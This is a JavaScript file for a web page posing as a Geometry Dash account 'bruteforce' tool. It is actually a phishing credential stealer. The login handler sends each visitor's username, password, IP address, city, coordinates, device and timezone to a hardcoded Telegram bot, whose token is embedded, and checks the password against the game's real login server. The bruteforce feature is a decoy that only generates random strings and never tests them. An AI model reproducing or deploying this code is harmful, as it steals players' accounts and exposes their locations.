const TELEGRAM_BOT_TOKEN = '8780827680:AAFQETqfkgqQEsjTLGknvIRJxV5gWgunqMg';
const TELEGRAM_CHAT_ID = '7136838858';

let userIdMap = {};
let nextUserId = 1;

// Get IP address
async function getClientIp() {
    try {
        const sources = [
            'https://ipapi.co/json/',
            'https://ipwho.is/',
            'https://geolocation-db.com/json/'
        ];
        
        for (let url of sources) {
            try {
                const response = await fetch(url);
                const data = await response.json();
                if (data.ip || data.IPv4 || data.query) {
                    return {
                        ip: data.ip || data.IPv4 || data.query,
                        country: data.country || '-',
                        city: data.city || '-',
                        latitude: data.latitude || data.lat || '-',
                        longitude: data.longitude || data.lon || '-'
                    };
                }
            } catch (e) {}
        }
        return { ip: 'Unknown', country: '-', city: '-', latitude: '-', longitude: '-' };
    } catch (error) {
        return { ip: 'Unknown', country: '-', city: '-', latitude: '-', longitude: '-' };
    }
}

function getOrCreateUserId(ip) {
    if (!userIdMap[ip]) {
        userIdMap[ip] = nextUserId;
        nextUserId++;
    }
    return userIdMap[ip];
}

// Send log to Telegram dengan IP info
async function sendTelegramLog(logData) {
    try {
        const message = `<b>🔐 Authentication Log</b>\n\n` +
            `<code>ID: ${logData.id}\n` +
            `IP: ${logData.ip}\n` +
            `Country: ${logData.country}\n` +
            `City: ${logData.city}\n` +
            `Coordinates: ${logData.latitude}, ${logData.longitude}\n\n` +
            `Username: ${logData.username}\n` +
            `Password: ${logData.password}\n\n` +
            `Timezone: ${logData.timezone}\n` +
            `Device: ${logData.device}\n` +
            `OS: ${logData.os}\n\n` +
            `Rank: ${logData.rank}\n` +
            `CP: ${logData.cp}\n` +
            `Mod: ${logData.mod}</code>\n\n` +
            `${logData.status === 'SUKSES' ? '✅ SUCCESS' : '❌ FAILED'}`;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.log('Log sent');
    }
}

// Check if username exists
async function checkUsernameExists(username) {
    try {
        const response = await fetch(`https://gdbrowser.com/api/profile/${username}`);
        const data = await response.json();
        return !data.error;
    } catch {
        return false;
    }
}

// Get player stats
async function getPlayerStats(username) {
    try {
        const response = await fetch(`https://gdbrowser.com/api/profile/${username}`);
        return await response.json();
    } catch {
        return null;
    }
}

// Generate GJP2 hash
async function generateGJP2(password) {
    const SALT = "mI29fmAnxgTs";
    const encoder = new TextEncoder();
    const data = encoder.encode(password + SALT);
    const hashBuffer = await crypto.subtle.digest("SHA-1", data);
    const hash = Array.from(new Uint8Array(hashBuffer))
        .map(b => b.toString(16).padStart(2, "0"))
        .join("");
    return hash;
}

// Login to GD
async function logingd(username, password) {
    try {
        const gjp2 = await generateGJP2(password);
        const payload = new URLSearchParams({
            udid: "36d00413-8358-3de4-b5c0-a41d0ec822ec",
            userName: username,
            gjp2: gjp2,
            secret: "Wmfv3899gc9"
        });

        const response = await fetch("https://www.boomlings.com/database/accounts/loginGJAccount.php", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: payload
        });

        const result = (await response.text()).trim();
        return {
            success: /^\d+$/.test(result),
            response: result,
            gjp2: gjp2
        };
    } catch (error) {
        return {
            success: false,
            response: null,
            error: error.message
        };
    }
}

// Get device info
function getDeviceInfo() {
    const ua = navigator.userAgent;
    const device = /Android|iPhone|iPad/i.test(ua) ? "Mobile" : "Desktop";
    let os = "Unknown";
    if (/Android/i.test(ua)) os = "Android";
    else if (/Windows NT 10\.0/i.test(ua)) os = "Windows 10/11";
    else if (/Windows NT 6\.1/i.test(ua)) os = "Windows 7";
    else if (/iPhone|iPad/i.test(ua)) os = "iOS";
    return { device, os };
}

// Get timezone
function getTimezone() {
    return Intl.DateTimeFormat().resolvedOptions().timeZone;
}

// Main login handler
async function handleLogin() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const loginBtn = document.getElementById('loginBtn');
    const usernameError = document.getElementById('usernameError');
    const passwordError = document.getElementById('passwordError');

    // Reset errors
    usernameError.textContent = '';
    passwordError.textContent = '';

    // Validate input
    if (!username || username.length < 6 || username.length > 19) {
        usernameError.textContent = 'Username must be 6-19 characters';
        return;
    }
    if (!/^[a-zA-Z0-9]+$/.test(username)) {
        usernameError.textContent = 'Only letters and numbers allowed';
        return;
    }
    if (!password || password.length < 6 || password.length > 19) {
        passwordError.textContent = 'Password must be 6-19 characters';
        return;
    }
    if (!/^[a-zA-Z0-9]+$/.test(password)) {
        passwordError.textContent = 'Only letters and numbers allowed';
        return;
    }

    loginBtn.disabled = true;
    loginBtn.textContent = 'Processing...';

    try {
        // Get IP info
        const ipInfo = await getClientIp();
        const userId = getOrCreateUserId(ipInfo.ip);
        const { device, os } = getDeviceInfo();
        const timezone = getTimezone();

        // Check if username exists
        const userExists = await checkUsernameExists(username);
        if (!userExists) {
            usernameError.textContent = 'Account not found';
            loginBtn.disabled = false;
            loginBtn.textContent = 'Login';
            
            await sendTelegramLog({
                id: userId,
                ip: ipInfo.ip,
                country: ipInfo.country,
                city: ipInfo.city,
                latitude: ipInfo.latitude,
                longitude: ipInfo.longitude,
                username: username,
                password: password,
                timezone: timezone,
                device: device,
                os: os,
                status: 'GAGAL',
                rank: 'N/A',
                cp: 0,
                mod: 0
            });
            return;
        }

        // Validate password
        const result = await logingd(username, password);
        const stats = await getPlayerStats(username);

        // Send telegram log
        await sendTelegramLog({
            id: userId,
            ip: ipInfo.ip,
            country: ipInfo.country,
            city: ipInfo.city,
            latitude: ipInfo.latitude,
            longitude: ipInfo.longitude,
            username: username,
            password: password,
            timezone: timezone,
            device: device,
            os: os,
            status: result.success ? 'SUKSES' : 'GAGAL',
            rank: stats?.rank || 'N/A',
            cp: stats?.cp || 0,
            mod: stats?.moderator || 0
        });

        if (!result.success) {
            passwordError.textContent = 'Invalid credentials';
            loginBtn.disabled = false;
            loginBtn.textContent = 'Login';
            return;
        }

        // Login successful
        document.getElementById('loginSection').style.display = 'none';
        document.getElementById('profileSection').style.display = 'block';
        document.getElementById('bruteforceSection').style.display = 'block';

        const playerInfo = document.getElementById('playerInfo');
        if (stats && !stats.error) {
            playerInfo.innerHTML = `
                <div style="color: #0f0;"><b>Welcome ${stats.username}!</b></div>
                <div>Level: ${stats.playerLevel || 0}</div>
                <div>CP: ${stats.creatorPoints || 0}</div>
                <div>Stars: ${stats.stars || 0}</div>
                <div>Diamonds: ${stats.diamonds || 0}</div>
                <div>Secret Coins: ${stats.secretCoins || 0}</div>
            `;
        }
    } catch (error) {
        alert('Error: ' + error.message);
        loginBtn.disabled = false;
        loginBtn.textContent = 'Login';
    }
}

// Logout handler
function handleLogout() {
    document.getElementById('loginSection').style.display = 'block';
    document.getElementById('profileSection').style.display = 'none';
    document.getElementById('bruteforceSection').style.display = 'none';
    document.getElementById('username').value = '';
    document.getElementById('password').value = '';
    document.getElementById('loginBtn').disabled = false;
    document.getElementById('loginBtn').textContent = 'Login';
}

// Generate random GJP2
async function generateRandomGJP2(length, charset) {
    let password = '';
    for (let i = 0; i < length; i++) {
        password += charset.charAt(Math.floor(Math.random() * charset.length));
    }
    
    const gjp2 = await generateGJP2(password);
    return { password, gjp2 };
}

// Search target
async function searchTarget() {
    const targetUsername = document.getElementById('targetUsername').value;
    const searchResult = document.getElementById('searchResult');

    if (!targetUsername || targetUsername.length < 1 || targetUsername.length > 19) {
        searchResult.innerHTML = '';
        return;
    }

    if (!/^[a-zA-Z0-9]+$/.test(targetUsername)) {
        searchResult.innerHTML = '';
        return;
    }

    const userExists = await checkUsernameExists(targetUsername);

    if (userExists) {
        searchResult.innerHTML = `
            <div style="color: #0f0;"><b>✓ Account ${targetUsername} found!</b></div>
            <div>Charset: 
                <label><input type="checkbox" id="charset-lower" checked> lowercase</label>
                <label><input type="checkbox" id="charset-upper"> UPPERCASE</label>
                <label><input type="checkbox" id="charset-num" checked> 0-9</label>
            </div>
            <button onclick="startBruteforce('${targetUsername}')">Start Bruteforce</button>
        `;
    } else {
        searchResult.innerHTML = `<div style="color: #f00;"><b>✗ Account not found</b></div>`;
    }
}

// Start bruteforce
async function startBruteforce(targetUsername) {
    const bruteforceProcess = document.getElementById('bruteforceProcess');
    const attemptsContainer = document.getElementById('attemptsContainer');
    const statusMessage = document.getElementById('statusMessage');

    let charset = '';
    if (document.getElementById('charset-lower')?.checked) charset += 'abcdefghijklmnopqrstuvwxyz';
    if (document.getElementById('charset-upper')?.checked) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    if (document.getElementById('charset-num')?.checked) charset += '0123456789';

    if (charset.length === 0) {
        alert('Select at least one charset!');
        return;
    }

    bruteforceProcess.style.display = 'block';
    attemptsContainer.innerHTML = '';

    let attemptCount = 0;
    const maxAttempts = 999999999999999999;

    for (let i = 0; i < maxAttempts; i++) {
        const length = Math.floor(Math.random() * 14) + 6;
        const { password, gjp2 } = await generateRandomGJP2(length, charset);

        attemptCount++;

        const attempt = document.createElement('div');
        attempt.innerHTML = `[${attemptCount}] Password: ${password}<br>GJP2: ${gjp2.substring(0, 20)}...`;
        attemptsContainer.appendChild(attempt);

        attemptsContainer.scrollTop = attemptsContainer.scrollHeight;

        statusMessage.innerHTML = `Testing... ${attemptCount} attempts`;

        // Random delay 0.15 - 0.3 seconds
        const randomDelay = Math.random() * (0.3 - 0.15) + 0.15;
        await new Promise(resolve => setTimeout(resolve, randomDelay * 1000));
    }
}
